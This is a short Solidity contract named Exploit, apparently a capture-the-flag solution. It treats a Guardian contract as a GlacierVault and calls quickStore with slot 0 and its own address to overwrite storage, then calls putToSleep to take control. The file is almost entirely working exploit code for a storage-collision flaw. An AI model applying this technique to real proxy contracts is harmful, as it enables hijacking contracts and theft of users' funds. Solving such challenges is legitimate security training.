// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Guardian.sol";
import "./GlacierVault.sol";
import "./Setup.sol";

contract Exploit {
    Setup public setup;
    Guardian public guardian;
    GlacierVault public vault;

    constructor(address _setup) payable {
        setup = Setup(_setup);
        guardian = Guardian(setup.TARGET());
        vault = GlacierVault(address(guardian));
    }

    function solve() public payable {
        require(msg.value == 1337, "msg.value != 1337");
        vault.quickStore{value: 1337}(0, uint256(uint160(address(this))));
        guardian.putToSleep();
    }
}